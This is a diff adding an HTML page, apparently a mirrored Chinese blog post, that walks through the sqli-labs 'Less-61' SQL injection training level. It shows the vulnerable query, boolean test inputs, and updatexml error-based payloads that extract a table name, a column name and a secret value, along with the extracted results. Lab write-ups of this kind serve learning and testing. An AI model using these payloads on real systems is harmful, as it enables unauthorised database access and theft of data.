@@ -1,0 +1,18 @@
+<hr>
+<h2 id="title-less61url-https-www-yuque-com-u29002979-ep2zrx-yierorvctngwd59u"><a href="#title-less61url-https-www-yuque-com-u29002979-ep2zrx-yierorvctngwd59u" class="headerlink" title="title: less61url: https://www.yuque.com/u29002979/ep2zrx/yierorvctngwd59u"></a>title: less61<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/yierorvctngwd59u">https://www.yuque.com/u29002979/ep2zrx/yierorvctngwd59u</a></h2><pre><code class="bash">$sql=&quot;SELECT * FROM security.users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;
+</code></pre>
+<p>闭合方式 ‘))</p>
+<p><code>?id=1&#39;)) and 1=1--+</code><br><code>?id=1&#39;)) and 1=2--+</code></p>
+<p><a name="OK6A0"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="bash">爆破数据表
+?id=-1&#39;)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
+数据表：vo9h7b29b1
+
+爆破字段名
+?id=-1&#39;)) and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#39;vo9h7b29b1&#39;),0x7e),1) -- +
+字段：secret_T03L
+
+获取密码
+?id=-1&#39;)) and updatexml(1,concat(0x7e,(select secret_T03L from vo9h7b29b1),0x7e),1) -- +
+密码：zA5wJbBXHvyGPdbQ8phfJBBn
+</code></pre>
